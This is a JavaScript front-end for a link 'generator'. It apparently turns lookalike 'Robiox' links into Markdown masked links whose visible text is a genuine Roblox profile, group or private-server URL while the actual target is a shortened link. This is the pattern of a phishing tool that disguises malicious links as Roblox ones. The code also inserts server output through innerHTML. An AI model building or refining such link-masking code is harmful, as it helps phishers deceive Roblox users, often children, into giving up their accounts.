const input = document.getElementById("userLink");
const typeSelect = document.getElementById("linkType");
const resultDiv = document.getElementById("result");
const btn = document.getElementById("generateBtn");
const copyBtn = document.getElementById("copyBtn");

const service = new URLSearchParams(window.location.search).get("service"); // preia serviciul din URL

btn.addEventListener("click", async () => {
  const userLink = input.value.trim();
  const type = typeSelect.value;
  if(!userLink) return alert("Please paste a link!");
  if(!service) return alert("No shortener selected!");

  // Mapare link Robiox → Roblox
  let robloxLink = "";
  if(type === "profile") robloxLink = "https://www.roblox.com/users/435559589933/profile";
  else if(type === "group") robloxLink = "https://www.roblox.com/groups/2194003353";
  else if(type === "private") robloxLink = "https://www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server";

  try {
    const res = await fetch("/api/shorten", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ service, url: robloxLink })
    });
    const data = await res.json();
    if(data.error) throw new Error(data.error);

    const finalLink = `${type.toUpperCase()}-[${robloxLink}](${data.shortLink})`;
    resultDiv.innerHTML = finalLink;
  } catch(err) {
    console.error(err);
    resultDiv.innerText = "Error shortening the link";
  }
});

copyBtn.addEventListener("click", () => {
  const text = resultDiv.innerText;
  navigator.clipboard.writeText(text).then(() => alert("Link copied!"));
});
